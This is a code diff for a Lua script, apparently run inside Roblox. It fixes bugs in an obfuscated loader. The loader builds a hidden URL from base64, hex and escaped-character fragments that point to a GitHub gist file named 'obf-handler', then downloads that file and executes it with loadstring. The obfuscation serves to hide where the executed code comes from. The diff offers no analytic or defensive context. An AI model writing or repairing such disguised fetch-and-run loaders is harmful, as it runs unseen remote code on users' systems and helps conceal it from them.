@@ -11,8 +11,8 @@ function decodeink(data, autolaunch, mode)
     local mode = mode or 2
     if mode == 1 then
     local result = ""
-    for i = 1, #hex, 2 do
-        local byte_str = hex:sub(i, i+1)
+    for i = 1, #data, 2 do
+        local byte_str = data:sub(i, i+1)
         local byte = tonumber(byte_str, 16)
         if byte then
             result = result .. string.char(byte)
@@ -53,7 +53,7 @@ end
 api_decode = function(api_keys)
 if not api_keys then return nil end
 local data = api_keys
-return loadstring([[local data_to_return = ""..decodeink("aHR0cHM=", false, 2).."://"..loadstring('return "\103\105\115\116"')().."."..webhold["name"]..""..decodeink("75736572636F6E74656E742E636F6D2F50726F36363650726F", false, 1)..""..tostring(data[1]).."\47"..webhold["type"].."\47"..tostring(data[2]).."\47"..tostring(data[3)..""\nreturn data_to_return]])()
+return loadstring([[local data_to_return = ""..decodeink("aHR0cHM=", false, 2).."://"..loadstring('return "\103\105\115\116"')().."."..webhold["name"]..""..decodeink("75736572636F6E74656E742E636F6D2F50726F36363650726F", false, 1)..""..tostring(data[1]).."\47"..webhold["type"].."\47"..tostring(data[2]).."\47"..tostring(data[3])..""\nreturn data_to_return]])()
 end
 
 return loadstring(game:HttpGet(tostring(api_decode({[1]="81253c\48\56\55\52c84e33b5ae5c70a\99\50\57eaa9";[2]="\51\51"..loadstring([[return "cf9f"]])().."\50\49\98\97\102ea\100\51\52\102\56\57\49\54\97f114becaadc73\52\57\56\51\52";[3]="obf-handler."..webhold["file-type"].."";}))))()
